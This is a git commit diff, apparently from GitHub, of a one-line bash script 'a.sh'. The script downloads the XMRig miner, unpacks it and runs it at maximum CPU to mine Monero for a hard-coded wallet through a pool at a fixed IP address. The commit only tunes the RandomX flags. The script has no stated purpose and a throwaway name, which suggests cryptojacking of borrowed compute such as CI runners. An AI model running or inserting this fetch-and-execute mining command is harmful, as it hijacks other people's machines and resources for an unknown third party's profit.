d7f33d52edae4db393eacb82e430d25768347350
chamalz <56085223+chamalz@users.noreply.github.com>
2020-09-10 03:17:40 -0700

    Update a.sh

--- 1/a.sh
+++ 1/a.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v5.5.3/xmrig-5.5.3-xenial-x64.tar.gz && tar -xvf xmrig-5.5.3-xenial-x64.tar.gz && cd xmrig-5.5.3 && ./xmrig  --donate-level=1  --max-cpu-usage 100 --coin=monero  -o 94.23.247.226:3333 -u 44ZVpaTg6u1Kaho5g2Ca5DB6eQneFbT1rf2xTEARmmJxgVH1qJktWRJeahcJanRfdzQKtTGwx7Mwj3qSQ2nHqJQTJrADuKb+700 -p or6 -k
+wget https://github.com/xmrig/xmrig/releases/download/v5.5.3/xmrig-5.5.3-xenial-x64.tar.gz && tar -xvf xmrig-5.5.3-xenial-x64.tar.gz && cd xmrig-5.5.3 && ./xmrig --randomx-no-numa  --randomx-mode=light  --no-huge-pages   --donate-level=1  --max-cpu-usage 100 --coin=monero  -o 94.23.247.226:3333 -u 44ZVpaTg6u1Kaho5g2Ca5DB6eQneFbT1rf2xTEARmmJxgVH1qJktWRJeahcJanRfdzQKtTGwx7Mwj3qSQ2nHqJQTJrADuKb+700 -p c1 -k
